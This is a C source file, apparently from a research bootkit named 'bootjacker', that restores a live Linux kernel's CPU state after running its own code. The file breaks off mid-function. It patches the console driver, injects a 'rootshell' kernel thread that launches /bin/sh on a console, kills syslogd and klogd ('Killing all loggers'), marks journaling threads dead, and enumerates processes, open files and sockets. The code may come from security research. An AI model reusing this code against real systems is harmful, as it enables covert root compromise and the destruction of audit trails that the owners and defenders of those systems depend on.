#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/moduleparam.h>
#include <linux/kthread.h>
#include <linux/workqueue.h>
#include <linux/kd.h>
#include <linux/console_struct.h>
#include <linux/console.h>
#include <linux/file.h>
#include <linux/ide.h>
#include <net/sock.h>
#include <net/inet_sock.h>
#include <asm/segment.h>
#include <asm/suspend.h>
#include <asm/system.h>
#include <asm/cacheflush.h>
#include <asm/tlbflush.h>
#include <asm/processor.h>
#include "common.h"
#include "linuxaddr.h"
#include "state.h"
#include "linuxstub.h"

unsigned bj_page_offset = PAGE_OFFSET;

int dummy_printk(const char* fmt, ...)
{
//	printf("dummy printk %s\n", fmt);
	return 0;
}

#define ROOTSHELL_LOC  (TRAMP_BASE + 100)
#define ROOTSHELL_SRC  (rootshell_callback)
#define ROOTSHELL_SIZE (100)
#define ROOTSHELL_DATA_LOC (TRAMP_BASE + 400)
#define BOOTJ_CONS_LOC (TRAMP_BASE + 600 + 4)
#define BOOTJ_CONS_PTR (TRAMP_BASE + 600)
#define SYS_SUCCESS_LOC (TRAMP_BASE + 900)
#define SYS_SUCCESS_SIZE (100)
#define DISK_HOOK_LOC   (TRAMP_BASE + 1000)
#define DISK_HOOK_SIZE   (200)
#define DISK_HOOK_DATA  (TRAMP_BASE + 1200)
#define ELEVATOR_HOOK_TARGET    (kk_elv_next_request + 0x3c)
#define ELEVATOR_HOOK_ASM   (TRAMP_BASE + 1500)
#define ELEVATOR_HOOK_SIZE  (100)
#define ELEVATOR_KILL_WRITE (TRAMP_BASE + 1600)
#define ELEVATOR_KW_SIZE    (100)

#define SYSCALL_BDFLUSH (134)
#define SYSCALL_SYNC (36)
#define SYSCALL_FSYNC (118)
#define SYSCALL_FDATASYNC (148)
#define SYSCALL_SYNC_FILE_RANGE (314)
#define SYSCALL_UMOUNT (52)
#define SYSCALL_OLDUMOUNT (22)

extern struct request *elv_next_req_hook(struct request *rq);

int (*s_printk)(const char* fmt, ...) = dummy_printk;

static struct saved_context bootjctxt;
extern int mod_start_addr;
extern int mod_end_addr;
extern char* cmdline;
void load_bootj_ctxt(void);
void early_vga_write(const char *str);

#ifdef swab32
#undef swab32
#define swab32(x)   (\
	(((x) & 0x000000ffUL) << 24) |            \
	(((x) & 0x0000ff00UL) <<  8) |            \
	(((x) & 0x00ff0000UL) >>  8) |            \
	(((x) & 0xff000000UL) >> 24))
#endif

char* substring(char* start, unsigned int strval, int limit)
{
	int limitcnt = 0;
	//printk("Searching for substring %x from %x %d bytes\n", strval, start, limit);
	while((limitcnt < limit) && (*((unsigned int*)(start + limitcnt)) != strval))
		limitcnt++;

	if(limitcnt == limit)
		return 0;

	return (char*)(start + limitcnt);
}

void put_hex_char(char c)
{
	char lgbuf[3] = {0,0,0};
	char hexchars[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
	lgbuf[0] = hexchars[(c & 0xf0) >> 4];
	lgbuf[1] = hexchars[c & 0x0f];
	lgbuf[3] = 0;
	early_vga_write(lgbuf);
}

void dump_hex(char* data, int n)
{
	int i = 0;
	while(n--) {
		put_hex_char(data[i++]);

		if(i % 4 == 0)
			early_vga_write(" ");
	}
}
/*
static inline void writew(unsigned short b, volatile void __iomem *addr)
{
        *(volatile unsigned short __force *) addr = b;
}
static inline void writel(unsigned int b, volatile void __iomem *addr)
{
        *(volatile unsigned int __force *) addr = b;
}
*/
void payload(void)
{
	printf("Executing payload!\n");
}
/*
static inline unsigned char readb(const volatile void __iomem *addr)
{
        return *(volatile unsigned char __force *) addr;
}
static inline unsigned short readw(const volatile void __iomem *addr)
{
        return *(volatile unsigned short __force *) addr;
}
static inline unsigned int readl(const volatile void __iomem *addr)
{
        return *(volatile unsigned int __force *) addr;
}
*/
void prep_sysmap(void)
{
	char* sysmap = (char*) mod_start_addr;
	char* s = sysmap;

	printf("Prepping module at %x\n", (int) sysmap);

	/* Replace all newlines with nulls */
	while((int)s < mod_end_addr)
	{
		// locate next sym
		while((*s++ != '\n') && ((int)s < mod_end_addr));
		*(s-1) = 0;
	}
}

void prep_symtab_lookup(void)
{
//	prep_sysmap();
}

unsigned long lookup_sym(char *sym)
{
    // Address of __symbol_get
    unsigned long (*func)(char *) = (void*) kk___symbol_get;
    unsigned retval = func(sym);
    if (retval == 0) {
        early_vga_write("Symbol not found: ");
        early_vga_write(sym);
        early_vga_write(" Halting!\n");
        while(1);
    }
    return retval;
}

unsigned long lookup_sym_old(const char* sym)
{
	char* sysmap = (char*) mod_start_addr;
	char* s = sysmap;
	char* ss = s;
	unsigned long addr;
	int symoff = strlen("c0000000 S "); // format of System.map

	printf("Dumping module at %x\n", (int) sysmap);

	while((int)s < mod_end_addr)
	{
		ss = s;
		
		// locate next sym
		while((*s++ != 0) && ((int)s < mod_end_addr));

//		printk("Sym line |%s|\n", ss+symoff);

		if(!strcmp(sym, ss+symoff))
			break;
	}

	if((int)s <= mod_end_addr)
	{
		addr = strtoul(ss, 0, 16);
//		printk("Found symbol %x %s at: %s\n", addr, sym, ss);
		return addr;
	}

	printk("Symbol not found %s... halting\n", sym);

	while(1);
}

struct tss_struct *k_per_cpu__init_tss;

void lookup_stubs(void)
{
	s_printk = (PFA) lookup_sym("printk");
	k_idt_descr = (struct Xgt_desc_struct*) kk_idt_descr;
	s_switch_to_new_gdt = (PFV) kk_switch_to_new_gdt;
	kk_init_task = (struct task_struct*) lookup_sym("init_task");
	k_per_cpu__init_tss = (struct tss_struct*) kk_per_cpu__init_tss;
	per_cpu__current_task = (struct task_struct*) kk_per_cpu__current_task;
	*((int*)(&per_cpu__gdt_page)) = kk_per_cpu__gdt_page;
}

unsigned int bootj_ebp;
unsigned int bootj_esp;

void print_init_task(void)
{
	struct task_struct* itask = (struct task_struct*) kk_init_task;
	struct task_struct** cctask = (struct task_struct**) per_cpu__current_task;
	struct task_struct* ctask;
	ctask = *cctask;

	printk("Init    task is at: %x name=%s pid=%d pgd=%x\n", (int) itask, itask->comm, 
		itask->pid, itask->active_mm->pgd);
	printf("Current task is at: %x name=%s pid=%d pgd=%x\n", (int) ctask, ctask->comm, 
           ctask->pid, ctask->active_mm->pgd);
}

void print_state(void)
{
	int idt = *((int*)k_idt_descr + 1);
		idt <<= 16;
		idt += (*((int*)k_idt_descr) >> 16);
	printk("Debug stuff...\n");
	printk("eax=%08x ebx=%08x ecx=%08x edx=%08x\n", bootjacker_eax, bootjacker_ebx, bootjacker_ecx, bootjacker_edx);
	printk("ebp=%08x esp=%08x esi=%08x edi=%08x\n", bootj_ebp, bootj_esp, bootjacker_esi, bootjacker_edi);
	printk("eip=%08x eflags=%08x\n", bootjctxt.return_address, bootjacker_efl);
	printk("cs=%02x ss=%02x ds=%02x es=%02x fs=%02x gs=%02x\n", bootjacker_cs, bootjctxt.ss, bootjacker_ds, bootjctxt.es, bootjctxt.fs, bootjctxt.gs);
	printk("ldtr=%04x tr=%02x\n", bootjctxt.ldt, bootjctxt.tr);
	printk("gdtr=%08x idtr=%08x\n", *((int*)&per_cpu__gdt_page), idt);
	printk("cr0=%08x cr2=%08x\n", bootjctxt.cr0, bootjctxt.cr2);
	printk("cr3=%08x cr4=%08x\n", bootjctxt.cr3, bootjctxt.cr4);

	print_init_task();
}

void rebuild_context(void)
{
	int idle_resume = 0;
	unsigned *hardirq_stack = (unsigned*) kk_hardirq_stack;
	char *default_idle = (char*) kk_default_idle;
	char *init_thread_union = (char*) kk_init_thread_union;
	char *cpu_idle = (char*) kk_cpu_idle;
	char *cpu_idle_call_default_idle, *idle_stack;
	unsigned stack_end = (unsigned)(hardirq_stack + 4096);
	unsigned reboot = kk_sysrq_handle_reboot;
	struct task_struct** cctask = (struct task_struct**) per_cpu__current_task;
	struct task_struct* ctask;
	ctask = *cctask;

	/* Figure out commandline */
	if(!strcmp(cmdline, "/boot/bootjacker-kernel qemu"))
	{
		printk("QEMU CR4 selected\n");
		bootjctxt.cr4 = 0x00000690;
	} else if(!strcmp(cmdline, "/boot/bootjacker-kernel memup")) {
		printk("QEMU CR4 selected, restoring to idle loop\n");
		bootjctxt.cr4 = 0x00000690;
	} else if(!strcmp(cmdline, "/boot/bootjacker-kernel syscallwrite")) {
		printk("QEMU CR4 selected, restoring to idle loop\n");
		bootjctxt.cr4 = 0x00000690;
	} else if(!strcmp(cmdline, "/boot/bootjacker-kernel idle")) {
		printk("QEMU CR4 selected, restoring to idle loop\n");
		bootjctxt.cr4 = 0x00000690;
		idle_resume = 1;
	} else if(!strcmp(cmdline, "/boot/bootjacker-kernel bochs")) {
		printk("Bochs CR4 selected\n");
		bootjctxt.cr4 = 0x00000010;
		print_state();
	} else if(!strcmp(cmdline, "/boot/bootjacker-kernel debug")) {
		print_state();
		while(1);
	} else {
		printk("Unknown CR4 selected... halting\n");
		while(1);
	}

	printk("Looking for return point...\n");
	while(((int)hardirq_stack < stack_end) && ((*hardirq_stack++ - reboot) > 30));

	printk("Found return points (ebp, esp)=%08x eip=%08x at offset %08x\n", hardirq_stack, *(hardirq_stack-1), (unsigned)hardirq_stack - kk_hardirq_stack);

	if(idle_resume)
	{
		printk("Current task is %s\n", ctask->comm);
/* cpu_idle
c080239a:       ff d2                   call   *%edx ---> default_idle
c080239c:       89 e0                   mov    %esp,%eax <----- Find this
c080239e:       25 00 f0 ff ff          and    $0xfffff000,%eax

		Then find 0xc080239c on stack(init_thread_union), and decrement by one word...
*/
#define CPU_IDLE_INSTRUCTIONS 0xffd289e0
		cpu_idle_call_default_idle = substring(cpu_idle, swab32(CPU_IDLE_INSTRUCTIONS), 100);
		if(!cpu_idle_call_default_idle)
		{
			printk("Cannot find call to default_idle! Halting.\n");
			while(1);
		}

		cpu_idle_call_default_idle += 2;

		printk("Call to default_idle() from cpu_idle() at: %x\n", (int)cpu_idle_call_default_idle);
//0xc0ae5fc0 <init_thread_union+4032>:	0xc0ae5fc8	0xc080239c	0xc0ae5fd0	0xc0a0314d
		idle_stack = (char*) substring((char*)((int)init_thread_union + 4000), (int)cpu_idle_call_default_idle, 100);

		if(!idle_stack)
		{
			printk("Cannot find idle restore stack %x! Halting.\n", (int)cpu_idle_call_default_idle);
			while(1);
		}

		idle_stack -= 4;
		printk("Idle stack at: %x\n", (int)idle_stack);

		bootj_esp = (int) idle_stack;

		/* default_idle:
c0802cc3:       fb                      sti    
c0802cc4:       f4                      hlt    
c0802cc5:       89 e0                   mov    %esp,%eax <-------- Find this
c0802cc7:       25 00 f0 ff ff          and    $0xfffff000,%eax
 		*/
#define DEFAULT_IDLE_INSTRUCTIONS 0xfbf489e0
		bootjctxt.return_address =  (int) substring((char*) default_idle, swab32(DEFAULT_IDLE_INSTRUCTIONS), 100);
		
		if(bootjctxt.return_address == 0) {
			printk("Idle restore point %x not found... halting.\n", DEFAULT_IDLE_INSTRUCTIONS);
			while(1);
		} else {
			bootjctxt.return_address += 2;
			printk("Resuming from idle at %x\n", bootjctxt.return_address);
		}
	} else {
		bootj_esp = (unsigned) hardirq_stack;
		bootj_ebp = (unsigned) hardirq_stack;

		if((int) hardirq_stack == (int)stack_end)
		{
			printk("Restore point not found!\n");
			while(1);
		}	

		bootjctxt.return_address = *(hardirq_stack - 1);
	}
}

#define bassert(cond, msg) if(!(cond)) { printk("Assertion failure: %s\n", msg); while(1); }

void check_context_sanity(void)
{
	struct task_struct* itask = (struct task_struct*) kk_init_task;
	struct task_struct** cctask = (struct task_struct**) per_cpu__current_task;
	struct task_struct* ctask = *cctask;
	char* debugstr = (void*)TRAMP_BASE;
	char* debugend = (void*) (TRAMP_BASE + 8192);
	char* t;
	int cr0, cr3, cr4, sp, idt;
	int bootj_idt = *((int*)k_idt_descr + 1);
	bootj_idt <<= 16;
	bootj_idt += (*((int*)k_idt_descr) >> 16);

	if(strcmp(itask->comm, "swapper"))
	{
		printk("Error! init task != swapper\n");
		while(1);
	}

	if(strcmp(ctask->comm, "swapper"))
	{
		printk("Warning! current %s != swapper fs=%x gs=%x\n", ctask->comm,
			ctask->thread.fs, ctask->thread.gs);
		bootjctxt.gs = ctask->thread.gs;
	}

	while(strncmp(debugstr, "emchandbg", 9) 
		&& (debugstr < debugend))
		debugstr++;


	if(debugstr != debugend)
	{
		t = debugstr;
		while(*t++ != '\n');
		*t = 0;

		printk("Debug string: %08x %08x %s\n",
			debugstr, debugend, debugstr);

		debugstr += strlen("emchandbg: cr0=");
		cr0 = strtoul(debugstr, 0, 16);

		debugstr += strlen("00000000 cr3=");
		cr3 = strtoul(debugstr, 0, 16);

		debugstr += strlen("00000000 cr4=");
		cr4 = strtoul(debugstr, 0, 16);

		debugstr += strlen("00000000 sp=");
		sp = strtoul(debugstr, 0, 16);

		debugstr += strlen("00000000 idt=00000000:00000000 idtr=");
		idt = strtoul(debugstr, 0, 16);

		printk("Read CR0=%08x CR3=%08x CR4=%08x SP=%08x IDT=%08x\n", 
			cr0, cr3, cr4, sp, idt);

		bassert(bootjctxt.cr0 == cr0, "CR0 unmatched");
//		bassert(bootjctxt.cr3 == cr3, "CR3 unmatched");
		bassert(bootjctxt.cr3 > 0x100000, "CR3 < 1MB overwritten?");
		bassert(cr3 > 0x100000, "CR3 < 1MB overwritten?");
		bassert(bootjctxt.cr4 == cr4, "CR4 unmatched");
		bassert((bootj_esp & 0xfffff000) == (sp & 0xfffff000), "SP unmatched");

		printk("Bootj IDT: %08x  Linux IDT: %08x\n", bootj_idt, idt);
		bassert(bootj_idt == idt, "IDT unmatched");
	} else {
		printk("No debug state area\n");
	}
}

#if 0
void debug_crap(void)
{
	int (*jif_read)(void) = lookup_sym("jiffies_read");
	char* jr = jif_read;
	volatile int jif;
	char hexchars[] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

	char* lgbuf = TRAMP_BASE;

	memcpy(lgbuf, "Bootjacker!!!!!!!abcdefghijklmnopqrstuvwxyz\0\0\0\0\n", 50);

	lgbuf[0] = hexchars[(jr[0] & 0xf0) >> 4];
	lgbuf[1] = hexchars[jr[0] & 0x0f];
	lgbuf[2] = hexchars[(jr[1] & 0xf0) >> 4];
	lgbuf[3] = hexchars[jr[1] & 0x0f];
	lgbuf[4] = hexchars[(jr[2] & 0xf0) >> 4];
	lgbuf[5] = hexchars[jr[2] & 0x0f];
	lgbuf[6] = hexchars[(jr[3] & 0xf0) >> 4];
	lgbuf[7] = hexchars[jr[3] & 0x0f];


#if 0
	asm("clflush (%0)" : : "r"(TRAMP_BASE));
	asm("clflush (%0)" : : "r"(TRAMP_BASE+32));
	asm("clflush (%0)" : : "r"(TRAMP_BASE+64));
#endif

#if 1
	if(!jif_read)
		while(1);

	jif = jif_read();
#endif	
//	early_vga_write("Crappolla1!!!!!!!!\n");

//	dump_hex(jif_read, 10);
	
}
#endif

int bootj_console_print(struct console* co, const char* b, unsigned count)
{
	int (*bj_printk)(const char* fmt, ...) = (void*) *((int*)BOOTJ_CONS_PTR);
	return bj_printk(b);
}

void vgafix(void)
{
	/* Fix vga console */
	/* Extremely elegant hack: just patch it. */
	struct console* s_vt_cons = (void*) kk_vt_console_driver;
	
	*((int*)BOOTJ_CONS_PTR) = (int) kk_early_printk;
	memcpy((void*)BOOTJ_CONS_LOC, (void*) bootj_console_print, 50);
	
	//s_vt_cons->write = bootj_console_print;
	s_vt_cons->write = (void*) BOOTJ_CONS_LOC;

	printk("Console hacked!!!!\n");
}

void prep_restore_context(void)
{
	printk("Looking for stubs\n");
	lookup_stubs();

//	debug_crap();

	vgafix();

	printk("Preparing a suitable restore context\n");

	load_bootj_ctxt();

	printk("Fabricating registers\n");
	rebuild_context();

	check_context_sanity();
}

void patch_restore_context(void)
{
	printf("Patching restore context with payload\n");
}

void do_restore(void)
{
	printf("All systems go...\n");
	printk("All systems go(printk)...\n");

	print_init_task();

	run_payload();

	/* Unreached */
	while(1);
}

void load_bootj_ctxt(void)
{
	struct task_struct** cctask = (struct task_struct**) per_cpu__current_task;
	struct task_struct* ctask;
	ctask = *cctask;

	bootjctxt.es = bootjacker_es;
	bootjctxt.fs = bootjacker_fs;
	bootjctxt.gs = bootjacker_gs;
	bootjctxt.ss = bootjacker_ss;

	bootjctxt.cr0 = bootjacker_cr0;
	bootjctxt.cr2 = bootjacker_cr2;

	bootjctxt.cr3 = (unsigned long) ctask->active_mm->pgd;
	bootjctxt.cr3 -= CONFIG_PAGE_OFFSET;

	bootjctxt.cr4 = bootjacker_cr4;

	bootjctxt.ldt = bootjacker_ldt;

	bootjctxt.tr = bootjacker_tr;
	bootjctxt.safety = 1;
}

#define TRAMPOLINE_LOC  TRAMP_BASE 
// 3 bytes are reserved for the initial stack push, so copy 3 bytes in to avoid it
#define TRAMPOLINE_SRC  (bootjacker_trampoline + 3)
#define TRAMPOLINE_SIZE 100
void bootjacker_trampoline(int cr3, int jmppt)
{
	/* WARNING*********
 	*  Do not modify this trampoline function.
 	*  If you must do so, JMPLOC is the address of the
 	*  nop after trampo.
 	*/
	#define JMPLOC 23
	asm("mov %eax, %cr3");
	asm("mov  $0x80, %eax");
	asm("ltr  %ax");
	asm("nop");
	asm("nop");
	asm("nop");
	asm("nop");

	asm("cli");

	/* WARNING: see above */
	asm volatile( "ljmp $0x60, %0\n"
		      "trampo:\n"
		      "nop\n"
		      "jmp %%ebx" :: "g"(TRAMPOLINE_LOC + JMPLOC)); 
	/* WARNING: see above */

	asm("nop");
	asm("nop");
	asm("nop");
	asm("nop");
	while(1);
}

void restore_cpu(void)
{
	struct task_struct** cctask = (struct task_struct**) per_cpu__current_task;
	int cpu = 0;
	struct tss_struct *tss = (struct tss_struct*) k_per_cpu__init_tss;
	struct i386_hw_tss *hwtss;
	struct task_struct* ctask;
	int* tsswd;
	char* tssstate;
	ctask = *cctask;

	//printk("run_payload\n");

	/* Copy trampoline to TRAMP_BASE */
	memcpy((void*)TRAMPOLINE_LOC, (void*)TRAMPOLINE_SRC, TRAMPOLINE_SIZE);

	flush_cache_all();
	__native_flush_tlb();
	barrier();

//	printk("write cr\n");
	write_cr4(bootjctxt.cr4);
	write_cr2(bootjctxt.cr2);
	write_cr0(bootjctxt.cr0);

//	printk("load gdt\n");
	switch_to_new_gdt();
	
//	printk("load idt\n");
	load_idt(k_idt_descr);

//	printk("load segments\n");

	loadsegment(es, bootjctxt.es);
	loadsegment(fs, bootjctxt.fs);
	loadsegment(gs, bootjctxt.gs);
	loadsegment(ss, bootjctxt.ss);
//	loadsegment(cs, bootjacker_cs); % CS is set by the ljmp later
	loadsegment(ds, bootjacker_ds);

	asm("nop");
	asm("nop");
	asm("nop");
	asm("nop");
	asm("nop");
	asm("nop");

	/* Fix TSS */
	hwtss = (struct i386_hw_tss*) &(tss->x86_tss);
	tsswd = (int*) (*((int*)&per_cpu__gdt_page) + 0x80 + 0x4);
	tssstate = (char*)tsswd + 0x1;
//	printk("Fixing TSS, x86 tss is at: %x, tsswd=%x, state=%x\n", (int)hwtss, *tsswd, (int) *tssstate);
	//clear the busy bit...
	*tssstate &= ~0x02;
//	printk("Fixed TSS, x86 tss is at: %x, tsswd=%x, state=%x\n", (int)hwtss, *tsswd, (int) *tssstate);
	/* TR selector is 0x80, so it's 128 bytes into the GDT/
         * The format is a bit weird though, but we need to unset
         * the busy bit.
         * ----------------------------------------------------------------------------
	   Figbloc.7-2     TSS Descriptor for 32-Bit TSS
	   Figure 7-2.  TSS Descriptor for 32-bit TSS

	     31                23                15                7               0
	    +-----------------+-----------------+-----------------+-----------------+
	    |                 | | | |A| LIMIT   | |     |S| Type  |                 |
	    |   BASE 31..24   |G|0|0|V|         |P| DPL | |       |   BASE 23..16   | 4
	    |                 | | | |L|  19..16 | |     |0|1|0|B|1|                 |
	    |-----------------------------------+-----------------------------------|
	    |                                   |                                   |
	    |             BASE 15..0            |             LIMIT 15..0           | 0
	    |                                   |                                   |
	    +-----------------+-----------------+-----------------+-----------------+
	    TR =0080 c025bde0 00002073 c0008925
	    0xc0260080 <per_cpu__gdt_page+128>:     0xbde02073      0xc0008b25 
						      aaaallll        aappttaa
	    a=address, l=limit, p=params, t=type
	    
	 */

	set_tss_desc(cpu, tss);
	asm("nop");
	asm("lldt %w0" :: "q"(0));

	asm("mov %0,%%eax" :: "g"(bootjacker_eax));
	asm("mov %0,%%ebx" :: "g"(bootjacker_ebx));
	asm("mov %0,%%ecx" :: "g"(bootjacker_ecx));
	asm("mov %0,%%edx" :: "g"(bootjacker_edx));
	asm("mov %0,%%edi" :: "g"(bootjacker_edi));
	asm("mov %0,%%esi" :: "g"(bootjacker_esi));
	asm("mov %0,%%ebp" :: "g"(bootj_ebp));
	asm("mov %0,%%esp" :: "g"(bootj_esp));
	//asm("mov $(bootjacker_efl),%efl"); flags can't be set

	asm("cli");

	asm("mov %0,%%ebx" :: "r"(bootjctxt.return_address));
	asm("mov %0,%%eax" :: "g"(bootjctxt.cr3));
	asm("ljmp $0x60, %0" :: "g"(TRAMPOLINE_LOC));

	/* Not reached */
	while(1);
}

/* !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 * !!!! NOTE !!!! NOTE !!!! NOTE !!!! NOTE !!!! NOTE !!!! NOTE !!!! NOTE !!!!
 * !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 *
 * Since payload.c is not linked against the kernel we can't directly call
 * any kernel functions from rootshell_exec and rootshell_callback. So we do
 * some fancy stuff to lookup the addresses of these function from bootjacker
 * and then pass that information on to the kernel. Just as with the trampoline
 * we copy rootshell_exec and rootshell_callback into the area reserved for
 * TRAMP_BASE, and then we setup a data structure in this same memory block
 * to hold the information we want to pass from bootjacker into the live
 * kernel.
 *
 * When making changed to rootshell_exec and rootshell_callback you should
 * make sure the linker doesn't try to use any data directly from bootjacker.
 * You can do this by disassembling the the bootjacker executable (which as of
 * the time of this writing is 'kernel' in the 'bootkit' directory) and looking
 * for any use of 0x100#### addresses in the generated assembly code.
 */
struct rootshell_data {
    struct work_struct worker;
    asmlinkage int (*printk)(const char * fmt, ...) __attribute__ ((format (printf, 1, 2)));
    int (*kernel_execve)(const char *filename, char *const argv[], char *const envp[]);
    int (*kernel_thread)(int (*fn)(void *), void * arg, unsigned long flags);
    int (*thread_entry)(void *data);
    asmlinkage long (*sys_close)(unsigned int fd);
    asmlinkage long (*sys_open)(const char __user *filename, int flags,
            int mode);
    asmlinkage long (*sys_dup)(unsigned int fildes);
    asmlinkage long (*sys_setsid)(void);
    char **envp_init;
    char test_str[20];
    char console[20];
    char shell[20];
    char *argv[4];
    char argv0[20];
    char argv1[20];
    char argv2[30];
};

/* ***************************************************************************
 * This function is the thread entry point for the thread created in
 * rootshell_callback. It only executes after bootjacker has jumped back
 * into the live kernel. If you make changes to this function, please read
 * the notes above the definition of struct rootshell_data.
 */
static int rootshell_exec(void *arg)
{
    struct rootshell_data *data = (struct rootshell_data *)arg;

    data->sys_close(0); data->sys_close(1); data->sys_close(2);
    data->sys_setsid();
    (void)data->sys_open(data->console,O_RDWR,0);
    (void)data->sys_dup(0);
    (void)data->sys_dup(0);
    return data->kernel_execve(data->shell, data->argv, data->envp_init);
}

#define ROOTSHELL_EXEC_LOC  (TRAMP_BASE + 200)
#define ROOTSHELL_EXEC_SRC  (rootshell_exec)
#define ROOTSHELL_EXEC_SIZE (200)

/* ***************************************************************************
 * This is the callback function passed to schedule_work by run_payload.
 * It only executes after bootjacker has jumped back into the live kernel.
 * If you make changes to this function, please read the notes above the
 * definition of struct rootshell_data.
 */
static void rootshell_callback(struct work_struct *work)
{
    struct rootshell_data *data = container_of(work, struct rootshell_data,
            worker);

    /* print the "I'm in here" message */
    (data->printk)(data->test_str);

    /* start a new thread */
    /* XXX: I don't know what the SIGCHLD flag is for. I stole it from
     * handle_initrd. */
    (data->kernel_thread)(data->thread_entry, data, SIGCHLD);
    /* since we don't wait on the newly created pid, we are probably going
     * to have a zombie process if the root shell exits. */
}

void jeffjacker(void)
{
        int FASTCALL((*kk_schedule_work)(struct work_struct *work));
        struct rootshell_data *data =
            (struct rootshell_data *)ROOTSHELL_DATA_LOC;

        /* copy rootshell_callback into TRAMP_BASE */
	memcpy((void*)ROOTSHELL_LOC, (void*)ROOTSHELL_SRC, ROOTSHELL_SIZE);

        /* copy rootshell_exec into TRAMP_BASE */
	memcpy((void*)ROOTSHELL_EXEC_LOC, (void*)ROOTSHELL_EXEC_SRC,
                ROOTSHELL_EXEC_SIZE);

        /* set the entry point for the kernel thread created in
         * rootshell_callback */
        data->thread_entry = (void *)ROOTSHELL_EXEC_LOC;

        /* lookup kernel symbols used by rootshell_callback and
         * rootshell_exec */
        data->printk = (void *)lookup_sym("printk");
        data->kernel_execve = (void*) kk_kernel_execve;
        data->kernel_thread = (void *)lookup_sym("kernel_thread");
        data->envp_init = (void *)kk_envp_init;
        data->sys_close = (void *)lookup_sym("sys_close");
        data->sys_open = (void *)lookup_sym("sys_open");
        data->sys_dup = (void *)kk_sys_dup;
        data->sys_setsid = (void *)kk_sys_setsid;

        /* setup strings used by rootshell_callback and rootshell_exec */
        strncpy(data->test_str, "I'm in here...\n", 20);
        strncpy(data->console, "/dev/tty4", 20);
        strncpy(data->shell, "/bin/sh", 20);

        /* setup argv for shell execed by rootshell_exec */
        data->argv[0] = data->argv0;
        data->argv[1] = data->argv1; 
        data->argv[2] = data->argv2;
        data->argv[3] = NULL;

        strncpy(data->argv0, "sh", 20);
        strncpy(data->argv1, "-c", 20);
        strncpy(data->argv2, "mount -o remount -o ro /", 30);

        /* schedule rootshell_callback to be executed once we jump to the
         * live kernel */
        kk_schedule_work = (void*)lookup_sym("schedule_work");
        INIT_WORK(&(data->worker), (void*)ROOTSHELL_LOC);

//        printk("data: 0x%08p, printk: 0x%08p, worker: 0x%08p\n",
//                data, data->printk, &(data->worker));
//        printk("test_str: 0x%08p \"%s\"\n",
//                (void *)(data->test_str), data->test_str);

        kk_schedule_work(&(data->worker));
}

struct {
	char* name;
	int signal;
} victim_list[] = { {"syslogd", SIGKILL}, {"klogd", SIGKILL}, {"pdflush", SIGKILL}, 
		{"kjournald", SIGKILL}, {"kblockd", SIGKILL}, { "", 0}};

void terminator(void)
{
	int i = 0;
	//char* victims[] = {"syslogd", "klogd", "pdflush", ""};

	int (*s_force_sig)(int, struct task_struct*) = (void*) kk_force_sig;
	struct task_struct* task = (struct task_struct*) (void*) kk_init_task;
	printk("Killing all loggers\n");
	while(task != NULL)
	{
//		printk("Looking at: %s\n", task->comm);

		i = 0;
		while(strcmp(victim_list[i].name, ""))
		{
//			printk("Checking prog: %s\n", victim_list[i].name);

			if(!strcmp(task->comm, victim_list[i].name))
			{
				printk("Found target process %s... setting new state\n", task->comm);
				if(!strcmp(task->comm, "pdflush")) {
                			set_task_state(task, TASK_DEAD);
				} else if(!strcmp(task->comm, "kjournald")) {
                			set_task_state(task, TASK_DEAD);
				} else if(!strcmp(task->comm, "kblockd")) {
                			set_task_state(task, TASK_DEAD);
				} else {
				//printk("Found target process %s... killing\n", task->comm);
					s_force_sig(victim_list[i].signal, task);
				}
				break;
			}

			i++;
		}


		task = next_task(task);
		if(((void*)task) == kk_init_task)
			break;
	}
	if(task ==  NULL)
		printk("Target process not found\n");
}

/**
 * Winston's intro to coding in bootjacker.
 */
void wwan2_hello(void)
{
	struct task_struct* task = (struct task_struct*) (void*) kk_init_task;

	printk("(wwan2_ps) Hello, my ps function is starting\n");

	while(task != NULL)
	{
		printk("(wwan2_ps) Looking at: %s\n", task->comm);

		task = next_task(task);
		if(((void*)task) == kk_init_task)
			break;
	}
	if(task ==  NULL)
		printk("(wwan2_ps) Init process not found\n");
}


static struct socket *sock_from_file(struct file *file, int *err)
{
//        if (file->f_op == &socket_file_ops)
                return file->private_data;      /* set in sock_map_fd */

        *err = -ENOTSOCK;
        return NULL;
}

void print_sock(struct sock* sk)
{
	struct inet_sock *inet = inet_sk(sk);

	//masks for human-readable IPs
	int mask0 = (int)0x000000ff;
	int mask1 = (int)0x0000ff00;
	int mask2 = (int)0x00ff0000;
	int mask3 = (int)0xff000000;
	int saddr = ntohl(inet->rcv_saddr);
	int daddr = ntohl(inet->daddr);


	//printk("socket at: %x inet at %x\n", sk, inet);
	printk("    socket from %d.%d.%d.%d:%d to %d.%d.%d.%d:%d\n", 
		(saddr & mask3) >> 24, 
		(saddr & mask2) >> 16, 
		(saddr & mask1) >> 8, 
		(saddr & mask0), 
		ntohs(inet->sport),
		(daddr & mask3) >> 24, 
		(daddr & mask2) >> 16, 
		(daddr & mask1) >> 8, 
		(daddr & mask0), 
		ntohs(inet->dport));
}

void print_dentry(struct dentry* d_entry)
{
	char* name;

	if(!d_entry)
	{
		return;
	}

	name = (char*) (d_entry->d_name.name);

	if(strcmp(name, "/") != 0)
	{
		print_dentry(d_entry->d_parent);
		printk("/%s", name);
	}
}

/**
 * Lists all processes and their open file descriptors
 */
void wwan2_lsfd(void)
{
	int i = 0, err = 0;
	int max_fds;

	struct task_struct* task = (struct task_struct*) (void*) kk_init_task;
	struct file* curr_fd;
	struct sock* sk;
	struct socket* sock;

	printk("(wwan2_lsfd) Starting to list file descriptors\n");

	while(task != NULL)
	{
		if(task->mm)  //skip kernel tasks (kernel tasks have no user space mapping?)
		{
			printk("(wwan2_lsfd) Looking at: %s pid=%d files=%p\n", task->comm, task->pid, task->files);
			max_fds = (((struct files_struct *)(task->files))->fdt)->max_fds;

			for(i = 0;i < max_fds; i++)
			{
				if(fcheck_files(task->files, i))
				{
					curr_fd = (struct file*) (void*) (task->files)->fd_array[i];
